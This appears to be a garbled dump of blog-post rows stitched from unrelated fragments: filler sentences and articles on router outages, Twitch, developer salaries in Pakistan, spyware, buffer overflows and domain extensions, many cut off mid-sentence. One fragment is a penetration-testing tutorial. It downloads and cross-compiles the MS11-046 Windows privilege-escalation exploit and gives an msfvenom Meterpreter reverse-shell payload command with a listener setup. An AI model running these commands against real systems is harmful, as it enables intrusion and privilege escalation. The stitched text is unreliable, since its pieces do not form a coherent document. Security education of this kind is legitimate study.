All you needed to do was look at her socks. They were never a matching pair. One would be green while the other would be blue. One would reach her knee while the other barely touched her ankle. Every other part of her was perfect, but never the socks. They were her micro act of rebellion.</p>\n	</li>\n	<li>\n	<p>He heard the loud impact before he ever saw the result.

She had been warned time and again, but she had refused to believe her. She had done everything right and she knew she would be rewarded for doing so with the promotion. So when the promotion was given to her main rival, it not only stung, it threw her belief system into disarray. It was her first big lesson in life, but not the last.</p>\n	</li>\n	<li>\n	<p>He watched as the young man tried to impress everyone in the room with his intelligence. There was no doubt that he was smart. The fact that he was more intelligent than anyone else in the room could have been easily deduced, but nobody was really paying any attention due to the fact that it was also obvious that the young man only cared about his intelligence.</p>\n	</li>\n	<li>\n	<p>She needed glasses.

You&rsquo;re probably downloading/uploading something or even streaming a video and all of a sudden your internet fails to temporarily. Hence you find it convenient to smash your router or complain to your Internet Service Provider. There are even scenarios where you may have gone to check your internet router and notice some indication that the internet is not working.</p>\n\n<p>The usual method of fixing it (which we all have done) is unplugging the router, waiting for a few minutes, then replugging it, and voila&rsquo; your internet is back up again. But why does this happen all the time? Is it because our Internet Service Providers just hate seeing us happily using the internet or something? Well actually, there are numerous reasons as to why our internet temporarily fails us over and over.</p>\n\n<p>First of all, it is a huge misconception that our routers are these magical boxes that provide us internet connectivity out of the blue. It&rsquo;s what&rsquo;s under the hood that counts because similar to our normal desktop PC, our routers have their own CPU, memory, and even an operating system which all play a crucial role in managing the data traffic and then deciding what needs to be sent and where. Moreover, these components can get overloaded similar to how a PC gets overloaded due to handling numerous tasks. So if you have a ton of devices connected to your router then chances are that there is a huge strain on the router itself which results into a sudden halt in terms of providing internet.</p>\n\n<p>This normally happens as our routers use dynamic IP addresses which basically assign IP addresses to help the route navigate through the internet traffic better and find your device. This is kind of like how street addresses work except it&rsquo;s all about the internet. So the IP address assigned stays with the router for a short period of time and then expires and then our ISP provides a new IP address and the rest happens as usual.</p>\n\n<p>So if you are downloading/uploading a heavy file while the router is aiming to shift to a new IP address then you may face certain issues with your internet.</p>\n\n<p>Another reason why our internet fails is normally that most users shove their internet router in a closed cozy space which is not recommended as even a router can heat up and cause problems. Hence it is recommended that your router should be placed in a proper open area where there is cross-ventilation. Just don&rsquo;t place the router under the sun, please.</p>\n\n<p>in addition, most of our WiFi routers that use the 2.4GHz band face interference from other household devices such as microwave ovens which overlap and make it difficult for your router to provide proper internet to your device. You can oversee this issue by downloading a simple mobile app that looks at nearby networks and helps you change your router settings. However, if you are not that tech-savvy it is recommended that you talk to the customer care representatives of your Internet Service Provider.</p>\n\n<p>Let us know in the comments how this article helped you solve your buggy internet issue or what other methods you may have tried.</p>', '1632394650image-asset.jpeg', 3, 'Published'),

Knowing this situation, Twitch has informed creators via email that it is working on a new process that will allow publishers and right holders to properly report content.</p>\n\n<p>This process is rather unique as it will first start with a warning instead of giving a direct penalty. In a nutshell, when a rights holder reports a stream, Twitch will first issue a warning and remove the clips which contain the unauthorized music. Moreover, in case of any flagrant violations such as rebroadcasting an entire show then a direct penalty may be issued. However, this depends on the user&rsquo;s track record and how much illegal activity does he or she has under his or her belt.</p>\n\n<p>Twitch will also remove videos in case of any disputes between creators.</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>Moreover, Billboard mentioned that Twitch and the NMPA have agreed on a time window to hash out music which will be handled on the platform going forward.

In a nutshell, no internet or GPS is required for this.</p>\n\n<p>The Gitamini is also equipped with &lsquo;pedestrian etiquette software&rsquo; which basically allows the robot to follow its leader at a safe distance while anticipating people in the environment.

Most founders agree that the biggest challenge for IT startups is competing for a limited pool of talent, especially during a time when remote work is on the rise.</p>\n\n<p>So, how costly is it for companies to hire and retain developers and programmers? Thanks to the findings of a recent Pakistan Software House Association (PASHA) salary survey&nbsp;<a href=\"https://www.dawn.com/news/1644626\" target=\"_blank\">shared by&nbsp;<em>Dawn</em></a>, we now have a better idea of how much programmers in Pakistan can bag when they embark on their journey.</p>\n\n<h2><strong>Average monthly pay</strong></h2>\n\n<p>Unsurprisingly, a programmer can reap a pretty decent income on average, at all levels of seniority.</p>\n\n<p>The average monthly salary for an entry-level programmer is PKR 51,344, while a senior developer with over six years of experience in the field can expect to pocket PKR 215,723 per month on average.</p>\n\n<p>If anything, these figures are reflective of the enormous potential for growth in the industry. But, we all know some skills are rewarded more than others. So which tech stack or programming skill is the most lucrative in Pakistan?</p>\n\n<h2><strong>The most rewarding programming skills in Pakistan</strong></h2>\n\n<p>MERN/MEAN/full-stack developers possess the highest average monthly salaries in the programming realm in Pakistan.</p>\n\n<p>Entry-level full-stack developers earn over PKR 61,000 per month, which increases to PKR 101,000 for junior developers with 1-3 years of experience, PKR 160,000 for mid-level developers with 3-6 years of experience, and PKR 233,534 for senior resources.</p>\n\n<p>In terms of lucrative tech stacks, Python, Ruby, and Node are other technologies that are right up there.</p>\n\n<p>The following are some other high-paying roles in the Pakistani tech sphere, with their average monthly salaries:</p>\n\n<ul>\n	<li>3D animator (entry-level): PKR 70,000</li>\n	<li>Data scientist/miner (junior-level): PKR 106,765</li>\n	<li>Game developers (mid-level): PKR 262,500</li>\n	<li>Game developers (senior-level): PKR 412,500</li>\n</ul>\n\n<p>&nbsp;</p>\n\n<p>Time to look at yet another interesting perspective with regards to programming jobs: impact of education.</p>\n\n<h2><strong>Impact of education credentials on tech jobs in Pakistan</strong></h2>\n\n<p>Jobs in the tech sector involve a plethora of skills, most of which are only possible via education, be it within the halls of a classroom or in the online sphere.</p>\n\n<p>One might be led to believe that a university education plays a very significant role in helping someone land a job at a decent company, but as it happens, that is not quite the case.</p>\n\n<p>As per the survey, only 21 percent of companies reported giving preference to Pakistani university graduates, while 11 percent favor those having international certifications. Interestingly, only a mere 9 percent of companies favor candidates with higher education or credentials from foreign institutions.</p>\n\n<p>While these statistics are bound to raise eyebrows, it is worth pointing out that graduates of leading local universities continue to lead in terms of employee headcount.</p>\n\n<p>Lahore and Islamabad acquire the most programming talent from COMSATS, followed Bahria University and FAST-NUCES. Meanwhile, Karachi-based companies regard the University of Karachi and NED as their biggest pools of talent.</p>\n\n<h2><strong>The future</strong></h2>\n\n<p>The IT industry in Pakistan, for all intents and purposes, is booming. Granted, there are still areas which could use some major improvement, especially gender diversity.</p>\n\n<p>Tech companies in general have a reputation for being dominated by men, and when one considers the national diversity ratio of 17.08 percent, it is clear that Pakistan has some serious catching up to do in this regard. The survey suggested that 65 percent of companies have a male-female ratio of less than 20 percent and only 6 percent of companies can boast a 40 percent female staff.</p>\n\n<p>Having said that, data like this is incredibly meaningful in terms of getting a clearer idea of where a particular industry stands and where it is headed. For Pakistan, the upward progress is encouraging, but with special focus on making the tech sphere more inclusive, it could certainly go even further.</p>', '163239583311512594484_6ab7131cc8_b1.jpg', 38, 'Published'),

Many hacker groups utilize different software tools to fetch information for personal profit and gain. Chances are even that fun game you installed on your phone might be sending your personal data to the owner without your consent.</p>\n\n<h2>How spyware works</h2>\n\n<p>In a nutshell, spyware is primarily software that resides on a device and sends data to the creator of the software. The data it fetches from your device varies, it may be surfing habits, system details, login information, or even data regarding your online banking methods. These spyware softwares can be in any form such as ads that pop up on your computer when you are searching for something or when you download a harmless productivity app or game. Once you download or open these so-called harmless apps and ads they provide you with what you think you need but also start gathering information about you from the backend and most probably sell it for profit.</p>\n\n<p>We always think how the top-rated apps in the Google Play Store and Apple&rsquo;s App Store are free and easily accessible but the reality is that you may not be paying with money but you certainly are paying for what you use with your data.</p>\n\n<h2>The effects of spyware</h2>\n\n<p>If you have a suspiciously friendly-looking app on your phone or some neat add-on for your browser, then it&rsquo;s most probably spyware. However, the effects of spyware aren&rsquo;t just collecting data as it also sends spam e-mail to you and your contacts. In addition, everything you search on the web might be traced. The worst-case scenario is when hackers download your images or try to access your banking details.</p>\n\n<p>There have been many cases where people have gone bankrupt by just clicking one advertisement on the internet. Based on previous records of spyware, hacker groups even got someone nearly to jail by utilizing a user&rsquo;s personal computer to break the law.</p>\n\n<h2>Avoiding spyware</h2>\n\n<p>Although ads and &lsquo;so-called friendly apps will keep popping up every now and then so hence there is very little chance that one could completely eradicate spyware from the world but you can always avoid it. Here are a few steps you can take to prevent spyware from mucking up your device:</p>\n\n<ul>\n	<li>Keep your Windows and Mac OS up to do date and ensure you install the latest security patches. Such patches are specifically designed to prevent spyware in the first place.</li>\n	<li>Install verified anti-virus softwares from reliable sources and ensure that they are constantly updated.&nbsp;The most popular brands include Norton, Microsoft Defender, McAfee, Spybot, Search &amp; Destroy, Pest Control, and Grisoft.</li>\n	<li>Do not download shareware or any application from an unknown source. Always check that the site connection is secure or not before proceeding.</li>\n	<li>After you download a software, be sure to read the terms and conditions before heading on to install the software.</li>\n	<li>Do not click on pop-up ads even if the ad shows the name of a popular brand. If you mistakenly open an add quickly close the tab. Moreover, if something you see is being downloaded after clicking the ad, make sure to cancel the download.</li>\n	<li>Try to install a firewall especially if you use a home network or if you have your own servers. This allows you further protection from hackers.</li>\n	<li>If you see a tab that pops up and says &lsquo;A virus has been detected.&rsquo; do not take any action and simply close the tab.</li>\n	<li>Never open e-mail attachments from unreliable sources.</li>\n</ul>\n\n<h2>Removing spyware</h2>\n\n<p>Let&rsquo;s say you have spyware in your computer or any other device, here are several steps you can take to remove the spyware:</p>\n\n<ul>\n	<li>Disconnect your device from the internet and run a comprehensive scan on your device using your anti-virus software.</li>\n	<li>Once detected check the location of the spyware and delete all respective files.</li>\n	<li>If nothing else works, format your hard drive and reinstall your OS and copy your data to your drive. In addition, eliminate unused applications and data.</li>\n</ul>\n\n<p>Let us know in the comments which steps worked for you.</p>', '1633183226.jpeg', 3, 'Published'),
(15, 'Buffer overflow explained The basics', 'buffer-overflow-explained-the-basics', 'habib123', '2021-09-23 16:40:59', '<p>One of the most common and oldest security vulnerabilities in software are buffer overflow vulnerabilities. Buffer overflow vulnerabilities occur in all kinds of software from operating systems to client/server applications and desktop software. This often happens due to bad programming and the lack of or poor input validation on the application side. In this article we will look at what a buffer overflow exactly is, how they work and how they can become serious security vulnerabilities. We will also look at what happens when a buffer overrun occurs and mitigation techniques to minimize their harmful effects.</p>\n\n<h2>What is a buffer overflow?</h2>\n\n<p>A buffer overflow is a situation where a running program attempts to write data outside the memory buffer which is not intended to store this data. When this happens we are&nbsp;talking about&nbsp;a buffer overflow or buffer overrun situation. A memory buffer is an area in the computer&rsquo;s memory (RAM) meant for temporarily storing data. This kind of buffers can be found in all programs and&nbsp;are used to store data for input, output and processing.</p>\n\n<p>An example of data stored in buffers are login credentials or the hostname for an FTP server. Also other data temporarily stored before processing can be stored in buffers. This literally could be anything from user input fields such as username and password fields to input files used to import certain configuration files.&nbsp;When the amount of&nbsp;data written to the buffer exceeds the expected amount of data, the memory buffer is overrun. This happens for example when a username with a maximum of 8 bytes is expected and a username of 10 bytes is given and written to the buffer. In this case the buffer is exceeded by 2 bytes and an overflow will occur when it&rsquo;s not prevented from happening. This often happens due to bad programming and the lack of input sanitization.</p>\n\n<p><img alt=\"buffer overflow example\" src=\"https://www.hackingtutorials.org/wp-content/uploads/2016/12/buffer-overflow-example.jpg\" style=\"height:231px; width:576px\" /></p>\n\n<p>An example of a buffer overflow when writing 10 bytes of data (username12) to an 8 byte buffer.</p>\n\n<h2>What happens when a buffer overflow occurs?</h2>\n\n<p>When a memory buffer overflow occurs and data is written outside the buffer, the running program may become unstable, crash or return corrupt information. The overwritten parts of memory may have contained other important data for the running application which is now overwritten and not available to the program anymore. Buffer overflows can even run other (malicious) programs or commands and result in arbitrary code execution.</p>\n\n<h3>Arbitrary code execution and privilege escalation</h3>\n\n<p>When a buffer overflow vulnerability is used to write malicious data in the memory and the attacker is able to take control of the execution flow of a program, we are dealing with a serious security vulnerability. Buffer overflows can then become serious security issues. These security&nbsp;issues&nbsp;can be exploited by&nbsp;hackers&nbsp;to take (remote) control of a host, perform privilege escalation or a lot more bad things as a&nbsp;result of arbitrary code execution. Arbitrary code execution is the process of injecting code in the buffer and get it to execute.</p>\n\n<p>Privilege escalation is performed through exploiting a buffer overflow vulnerability to execute arbitrary code in a program that is running with system privileges. The executed code can be shellcode which gives the attacker an OS shell with administrative privileges for example, or even add a new (administrator) user to the system. Also with buffer overflows the executed code happens in the context of the running application. This means that when the exploited&nbsp;application runs under with administrative privileges, the malicious code will also be executed with administrative privileges.</p>\n\n<h3>Denial of Service (DoS)</h3>\n\n<p>Not all buffer overflow vulnerabilities can be exploited to gain arbitrary code execution. Also (remote) Denial of Service attacks can be performed when they only crash the running program. As buffer overflows vulnerabilities can occur in any software&nbsp;DoS attacks&nbsp;are not just limited to services and computers. Also routers, firewalls IoT devices and anything else running an OS can be targeted. An example of this situation is the recent Cisco ASA IKEv1 and IKEv2 Buffer Overflow exploits lately. Some of these remote exploits only crash and force reboot the firewall&nbsp;resulting in a&nbsp;couple minutes downtime.</p>\n\n<h2>How to prevent buffer overflows from occurring?</h2>\n\n<p>Buffer overflows in software can be prevented or mitigated in several ways. Mitigation is the process of minimizing the impact of a threat before or after the threat occurs. This is exactly what we need to do when it comes to buffer overflows. They can be prevented from happening before they occur (proactive). But, since buffer overflows keep occurring, despite the proactively taken actions to avoid them, we also need mechanisms in place to minimize impact when they do occur (reactive countermeasures). Let&rsquo;s have a look at how buffer overflow prevention and mitigation works.</p>\n\n<h3>Buffer overflow prevention</h3>\n\n<p>The best and most effective solution is to prevent buffer overflow conditions from happening in the code. For example when a maximum of 8 bytes as input data is expected, than the amount of data which can be written to the buffer to be limited to 8 bytes at any time. Also, programmers should be using save functions, test code and fix bugs accordingly.&nbsp;Proactive methods for buffer overflow prevention like these should be used whenever possible to limit buffer overflow vulnerabilities.</p>\n\n<p><a href=\"https://www.virtualhackinglabs.com/?utm_source=ht&amp;utm_medium=postbanner&amp;utm_campaign=ht\" target=\"new\"><img alt=\"Virtual Hacking Labs - Penetration testing lab\" src=\"https://www.hackingtutorials.org/wp-content/uploads/2020/02/VHL-Banner-2.jpg\" /></a></p>\n\n<h3>Buffer overflow mitigation</h3>\n\n<p>Another way of safeguarding to buffer overflows is to detect them as they happen and mitigate the situation. This is an reactive approach and focuses on minimizing the harmful impact. An example of effective mitigation is a modern operating system which protects certain memory areas from being written to or executed from. This will prevent an attacker from writing arbitrary code to the memory when a buffer overflow occurred. Implementations like DEP, ASLR, SEHOP and executable space and pointer protection try to minimize the negative impact of a buffer overflow. This does not prevent the buffer overflow from occurring, but it does minimize the impact.</p>\n\n<p>Another way of passive buffer overflow detection&nbsp;is using intrusion detection systems (IDS)&nbsp;to analyse network traffic.&nbsp;An IDS is capable of&nbsp;detecting signatures in network traffic which are&nbsp;known to exploit&nbsp;buffer overflow vulnerabilities. The IDS can than mitigate the attack and&nbsp;prevent the payload from executing on the targeted system.</p>\n\n<h2>How does a buffer overflow work and look like in code?</h2>\n\n<p>Let&rsquo;s have a look at how a buffer overflow actually works by looking at the program code. We explain this process using a very known function vulnerable to buffer overflow is the strcopy() function in the c library. This functions uses 2 pointers as parameters, the source which points to the source array to copy from and the destination pointer to the character array to write to. When the function is executed the source array of chars will be copied to the destination array and does not have a check for bounds when it does so. When the source buffer is larger than the destination buffer, than the buffer is overrun.</p>\n\n<h3>Buffer overflow with strcpy()</h3>\n\n<p>The follow image is an example of the strcpy() function using a source which is overrunning the destination buffer.</p>\n\n<p><img alt=\"buffer overflow strcpy example\" src=\"https://www.hackingtutorials.org/wp-content/uploads/2016/12/buffer-overflow-strcpy-example.jpg\" style=\"height:407px; width:576px\" /></p>\n\n<p>The code would look like the following image in you IDE of choice:</p>\n\n<p><img alt=\"buffer overflow strcpy code\" src=\"https://www.hackingtutorials.org/wp-content/uploads/2016/12/buffer-overflow-strcpy-code.jpg\" style=\"height:184px; width:514px\" /></p>\n\n<p>In this example the buffer is overrun with 2 bytes containing a harmless 1 and 2. Since the strcpy() function does not perform a bounds check we could write anything outside the buffer space. Also malicious code like shellcode. In the following tutorials about buffer overflows&nbsp;we will learn about overrunning buffers with shellcode instead of 1&rsquo;s and 2&rsquo;s. We will also learn how to control the execution flow of a program and execute the malicious shellcode outside the buffer.</p>\n\n<h2>Lessons learned</h2>\n\n<p>We have learned that a buffer overflow is caused by certain conditions where a running program is writing data outside the memory buffer. By injecting (shell)code and redirecting the execution flow of a running program to that code, an attacker is able to execute that code. This is called arbitrary code execution. With arbitrary code execution an attacker is able to gain (remote) control of a specific target, elevate privileges or cause a denial of service on the target.</p>\n\n<p>Buffer overflows can be proactively prevented and mitigated with several techniques. Programmers should write secure code and test it for buffer overflows. When a buffer overflow is not prevented from happening it can still be mitigated with reactive methods like protecting memory from being written to.</p>\n\n<p>We have tried to explain buffer overflow basics without to many technical details. In the following tutorials about this subject we will get into more details regarding stack based buffer&nbsp;overflows, heap based buffer&nbsp;overflows and how to detect and exploit buffer overflows vulnerabilities in software. We will also be learning about shellcode and writing our own basic buffer overflow exploits.</p>', '1633183172.jpg', 1, 'Published');

Therefore it is highly likely you will encounter a lot of Windows workstations and servers during your penetration testing training and career. On the other hand, most penetration testers mainly use Linux based distributions such as Kali Linux, Pentoo or Backbox. Therefor you need the ability to quickly compile Windows exploits on your Linux machine. The solution for this is: Mingw-w64.</p>\n\n<p>Mingw-w64 is a free and open source software development environment for creating Windows applications. Mingw-w64 was originally called Mingw32 which didn&rsquo;t support the 64 bit architecture. In this tutorial we will be looking at how to use Mingw-64 to compile exploits for Windows on Kali Linux. Let&rsquo;s start with installing Mingw-w64 on Kali Linux.</p>\n\n<h2>Installing Mingw-w64 on Kali Linux</h2>\n\n<p>Mingw-w64 is not installed by default on Kali Linux 2016.2 and earlier version. Therefore we need to install it first before we can compile Windows exploits on Linux. Run the following commands to install Mingw-w64:</p>\n\n<blockquote>\n<p>apt-get update</p>\n\n<p>apt-get install mingw-w64</p>\n</blockquote>\n\n<p><img alt=\"installing-mingw-w64\" src=\"https://www.hackingtutorials.org/wp-content/uploads/2016/11/Installing-Mingw64.jpg\" style=\"height:574px; width:804px\" /></p>\n\n<p>Use apt-get install mingw-w64 to install Mingw-w64 on your Kali host.</p>\n\n<p>Type y for yes to confirm and continue the Mingw-w64 installation process. Downloading and installing Mingw-w64 may take a little while to complete.</p>\n\n<h3>Unable to locate package mingw-w64</h3>\n\n<p>Sometimes you get a Unable to locate package mingw-w64 error when trying to install the mingw-w64 package and get something like:</p>\n\n<blockquote>\n<p>root@kali:~# apt-get install mingw-w64</p>\n\n<p>Reading package lists&hellip; Done</p>\n\n<p>Building dependency tree</p>\n\n<p>Reading state information&hellip; Done</p>\n\n<p>E: Unable to locate package mingw-w64</p>\n</blockquote>\n\n<p>To solve this issue make sure you have the right repositories in the sources.list file. You can edit the file using nano:</p>\n\n<blockquote>\n<p>/etc/apt/sources.list</p>\n</blockquote>\n\n<p>Make sure you have the correct repositories in this file. You can find the repositories for different versions of Kali Linux on the following page:</p>\n\n<p><a href=\"https://docs.kali.org/general-use/kali-linux-sources-list-repositories\">https://docs.kali.org/general-use/kali-linux-sources-list-repositories</a></p>\n\n<p>With the right repositories in the sources.list file you need to run apt-get update and then run the installation command for the Mingw-w64 package again.</p>\n\n<h2>Cross compiling Windows exploits with Mingw-w64</h2>\n\n<p>Now that we have Mingw-w64 installed we can start to compile Windows exploits on Kali Linux. For this tutorial we will be compiling a Windows exploit written in c to exploit CVE-2011-1249 (MS11-046) vulnerability in Windows 7 SP0 x86. This version of the Windows operating system contains a vulnerability in the Ancillary Function Driver (AFD) which allows an elevation of privilege for an authenticated non administrative user. Even though Mingw-w64 was developed for the much needed 64 bit support we can also compile 32 bit Windows exploits. Let&rsquo;s have a look at how we can compile 32 bit Windows exploits.</p>\n\n<p>Let&rsquo;s start with downloading the exploit from Exploit-db:</p>\n\n<blockquote>\n<p>wget ‐‐output-document= 40564.c https://www.exploit-db.com/download/40564</p>\n</blockquote>\n\n<p>Use the following command to compile the afd.sys exploit for Windows 32 bit:</p>\n\n<blockquote>\n<p>i686-w64-mingw32-gcc [input file: source]&ndash;o [output file: .exe]&ndash;lws2_32</p>\n</blockquote>\n\n<p>The following command will compile the Windows 7 afd.sys privilege escalation exploit:</p>\n\n<blockquote>\n<p>i686-w64-mingw32-gcc 40564.c &ndash;o exploit.exe &ndash;lws2_32</p>\n</blockquote>\n\n<p><img alt=\"Compile Windows x64 exploit with Mingw-w64\" src=\"https://www.hackingtutorials.org/wp-content/uploads/2016/11/Compile-Windows-x64-exploit-with-Mingw64.jpg\" style=\"height:76px; width:787px\" /></p>\n\n<p>Compile the Windows exploit.</p>\n\n<p>To transfer the exploit to the target host we will be serving it with the build-in Apache webserver. The last 2 commands will copy exploit to the Apache home directory and start the Apache webserver.</p>\n\n<p>When we download and execute the exploit from cmd.exe it will look like this:</p>\n\n<p><img alt=\"Windows exploit results\" src=\"https://www.hackingtutorials.org/wp-content/uploads/2016/11/Windows-exploit-results.jpg\" style=\"height:552px; width:516px\" /></p>\n\n<p>The exploit executed successfully.</p>\n\n<p>As we can see the whoami command returns a privileged user before executing the exploit and system user after. This exploit actually spawns a new shell in the current shell where it was launched from instead of a new shell in a new window. This means we can also run this exploit from command line shell, such as Meterpreter. Let&rsquo;s see how we can run the exploit from a Meterpreter session.</p>\n\n<h2>Exploit compilation errors</h2>\n\n<p>When compiling exploits for different architectures and operating systems many errors can occur. There are a lot of variables which can cause the compilation to fail, such as: syntax, libraries, host and target architectures, installed software used for compiling code and a lot more. Some errors may be easy to fix and some are not. It is also important to distinct warnings from fatal errors since warnings may just indicate something like deprecated functions which do not prevent the exploit from working. Fatal errors do prevent the exploit from working and therefor need to be fixed.</p>\n\n<p>The best way to deal with compilation errors is to read them carefully and then search Google for solutions. Often you&rsquo;re not the first and only person facing a certain compilation error and therefore it is not necessary to reinvent the wheel. Online resources such as stack exchange often provide you with possible solutions for the most common compilation errors.</p>\n\n<h2>Exploit MS11-046 from a Meterpreter shell</h2>\n\n<p>Let&rsquo;s quickly generate a Windows 32-bit Meterpreter reverse TCP payload using Msfvenom and execute it on the target host. We will be using the multi handler in Metasploit to catch the reverse shell.</p>\n\n<p>Use the following command to create the payload using Msfvenom:</p>\n\n<blockquote>\n<p>msfvenom -a x86 &ndash;platform Windows -p windows/meterpreter/reverse_tcp LHOST=[IP attackbox] LPORT=4444 -e x86/shikata_ga_nai &ndash;f exe &ndash;o exploit.exe</p>\n</blockquote>\n\n<p>Be sure to replace the listening host IP and if necessary the listening port. Now start msfconsole and run the following commands to set up the multi handler exploit:</p>\n\n<blockquote>\n<p>use exploit/multi/handler</p>\n\n<p>set lhost [listening host IP]</p>\n\n<p>set lport 4444</p>\n\n<p>run</p>\n</blockquote>\n\n<p><img alt=\"MSF multi handler\" src=\"https://www.hackingtutorials.org/wp-content/uploads/2016/11/MSF-multi-handler.jpg\" style=\"height:98px; width:492px\" /></p>\n\n<p>Start the reverse TCP handler on port 4444.</p>\n\n<p>Than download the exploit to the target host and execute it. If everything was setup correctly you should receive a reverse Meterpreter shell on the msfconsole:</p>\n\n<p><img alt=\"MSF multi handler reverse shell\" src=\"https://www.hackingtutorials.org/wp-content/uploads/2016/11/MSF-multi-handler-reverse-shell.jpg\" style=\"height:169px; width:786px\" /></p>\n\n<p>The target host connects back to the Kali box.</p>\n\n<p>Next type shell on the Meterpreter command line and run the privilege escalation exploit to escalate the shell to a system shell:</p>\n\n<p><img alt=\"Windows 7 privilege escalation exploit\" src=\"https://www.hackingtutorials.org/wp-content/uploads/2016/11/Windows-7-privilege-escalation-exploit.jpg\" style=\"height:292px; width:591px\" /></p>\n\n<p>The privilege escalation exploit executed successfully through our Meterpreter sessions.</p>\n\n<p>As you can see the shell goes from the privileged test user shell to a system shell. Please note that a new system shell is spawned in the shell where it was executed from. Therefor we cannot see the exploit output as it is in the old shell with limited privileges.</p>\n\n<p>You can verify this by typing Exit which will exit the system shell and return you to the user shell which still contains the Windows 7 privilege escalation exploit output:</p>\n\n<p><img alt=\"Windows 7 privilege escalation exploit results\" src=\"https://www.hackingtutorials.org/wp-content/uploads/2016/11/Windows-7-privilege-escalation-exploit-results.jpg\" style=\"height:478px; width:321px\" /></p>\n\n<p>The exploit output on the privileged user shell.</p>\n\n<h2>&nbsp;</h2>\n\n<h2>Lessons learned</h2>\n\n<p>In this tutorial we have learned the basics of cross compiling exploits for Windows on Linux. We have learned how to install Mingw-w64 on Kali Linux and solve the most common installation problems. To practice the exploit compilation process we have compiled a privilege escalation exploit targeted for Windows 7 x86. This is also called cross compiling.</p>\n\n<p>We have successfully executed the&nbsp;compiled executable on the target host and escalated the shell from a limited user shell to a system shell. We have learned that this particular exploit spawned a shell inside the shell where the exploit was executed from. This way we can also execute the privilege escalation exploit from a command line such as a Meterpreter shell. Last but not least we have learned about how to fix errors during the compilation process. As an ethical hacker and penetration tester it is advised to consult resources like stack exchange to search for solutions for compilation errors.</p>', '1633183144.jpg', 2, 'Published'),

Choosing the right domain name is crucial because it can have an impact on your branding and search rankings.</p>\n\n<p>In this article, we will explain the difference between .com vs .net domain extensions and which one is better for your website.</p>\n\n<p>What Are .Com and .Net Domain Name Extensions?</p>\n\n<p>A domain name is your website&rsquo;s address on the internet. Ours is&nbsp;<em>wpbeginner.com</em>.</p>\n\n<p>To learn more about domain names, see our beginner&rsquo;s guide on&nbsp;<a href=\"https://www.wpbeginner.com/beginners-guide/beginners-guide-what-is-a-domain-name-and-how-do-domains-work/\">what is a domain name and how do domains work</a>.</p>\n\n<p>Domain names always have an extension. This is sometimes also called a TLD, which stands for Top Level Domain. For instance:</p>\n\n<p>example<strong>.com</strong><br />\nexample<strong>.net</strong><br />\nexample<strong>.org</strong></p>\n\n<p>You can choose from a wide range of domain extensions when&nbsp;<a href=\"https://www.wpbeginner.com/guides/\">making your website</a>.</p>\n\n<p>Most domain extensions don&rsquo;t have any restrictions on usage and lots of&nbsp;<a href=\"https://www.wpbeginner.com/beginners-guide/should-you-choose-a-new-domain-extension-for-your-website/\">new domain extensions</a>&nbsp;have been created in recent years.</p>\n\n<p>However, extensions were originally created for different types of websites. They have specific meanings.</p>\n\n<p>You need to choose a domain name extension that fits your business while helping you build a recognizable brand in your industry.</p>\n\n<p>Let&rsquo;s take a look at the difference between the most popular .com vs .net domain extensions to see which is better for your business.</p>\n\n<p>Difference Between .Com vs .Net Domain Names</p>\n\n<p><img alt=\"The .com vs .net domain extension\" src=\"https://www.wpbeginner.com/wp-content/uploads/2020/04/com-vs-net-domain-extension.png\" style=\"height:320px; width:550px\" /></p>\n\n<p>Com and Net are two of the most popular domain name extensions. If your preferred .com domain name extension is not available, then you might be tempted to use a .net instead.</p>\n\n<p>However, .net isn&rsquo;t a good option for your business in most cases.</p>\n\n<p>The &ldquo;com&rdquo; in the .com domain name indicates a &ldquo;commercial&rdquo; site. This can cover business websites, websites that want to&nbsp;<a href=\"https://www.wpbeginner.com/beginners-guide/make-money-online/\">make money online</a>, personal websites, blogs, portfolios, and more.</p>\n\n<p>On the other hand, the &ldquo;net&rdquo; in the .net domain name extension stands for &ldquo;network&rdquo;. It was designed for the internet, networking, and email service providers.</p>\n\n<p>If you&rsquo;re wondering about .org, that stands for &ldquo;organization&rdquo; and was originally intended for use by&nbsp;<a href=\"https://www.wpbeginner.com/showcase/best-wordpress-themes-for-nonprofits/\">nonprofit organizations</a>.</p>\n\n<p>When Should You Choose a .Com Domain Name?</p>\n\n<p><img alt=\"The extension .com on a bulletin board\" src=\"https://www.wpbeginner.com/wp-content/uploads/2020/04/dot-com-extension.jpg\" style=\"height:273px; width:550px\" /></p>\n\n<p>The .com domain extension has been synonymous with the internet since the &ldquo;dot-com bubble&rdquo; in the late 1990s. Over 40% of all registered domain names are .com domains.</p>\n\n<p>It&rsquo;s much easier for people to remember a .com domain name than any other domain extension. It&rsquo;s familiar and reassuring, plus it makes your site look professional.</p>\n\n<p>Also, most mobile keyboards have a dedicated .com button. You won&rsquo;t find that for .net (or any other extension).</p>\n\n<p>There&rsquo;s just one problem. You&rsquo;ve probably noticed that .com domain names are so popular that it feels like all the good ones are already taken!</p>\n\n<p>However, there are still plenty of clever ways to get the perfect .com domain name. Here are some things to try:</p>\n\n<ul>\n	<li>Check that your domain name represents your business and what you do. For example, stargardeningservices.com is better than starservices.com.</li>\n	<li>If your preferred domain name is taken, then you can add a word before or after it to make it unique. Your location could work well here. For example, stargardeninghouston.com.</li>\n	<li>Make sure your domain name can be easily pronounced and remembered. Don&rsquo;t use hyphens or numbers in your domain name.</li>\n	<li>Take advantage of&nbsp;<a href=\"https://www.wpbeginner.com/showcase/14-best-free-domain-name-generators-on-the-internet/\">online domain name generators</a>.

You could use it if you offer internet, networking, database hosting, email hosting, or similar services.</p>\n\n<p>You might even want to use a .net domain name if it truly suits your brand.</p>\n\n<p>For example, Behance.net is a popular online design community which uses a .net domain extension for their website. It suits them because they wanted to be a network of artists, designers, and companies looking for talent.</p>\n\n<p>Under 4% of all domain names registered are using the .net domain extension.</p>\n\n<p>Why You Might Be Tempted to Use the .Net Extension</p>\n\n<p>Have you ever tried to register a .com domain and seen something like this?</p>\n\n<p><img alt=\"The .net domain is being promoted as an alternative to the .com one\" src=\"https://www.wpbeginner.com/wp-content/uploads/2020/04/search-domain-name-net-promoted.png\" style=\"height:269px; width:550px\" /></p>\n\n<p>Domain name registrars often present .net as the top alternative to .com. This might make you think it&rsquo;s more commonly used than it actually is.</p>\n\n<p>Even the most well-known internet and network service companies use a .com domain name for their business.</p>\n\n<p>Of course, 4% is still a lot of domain names. Over 13 million, in fact. You might wonder who&rsquo;s using all those .net domain names.</p>\n\n<p>In many cases, the .net domains aren&rsquo;t really being used.</p>\n\n<p>Many businesses register a .net extension so no-one else can take it. They may not use the .net domain, or they may redirect it to their .com. site.</p>\n\n<p>Also, some companies started with a .net because they couldn&rsquo;t get the .com they wanted. Most later transferred to a .com domain extension, often 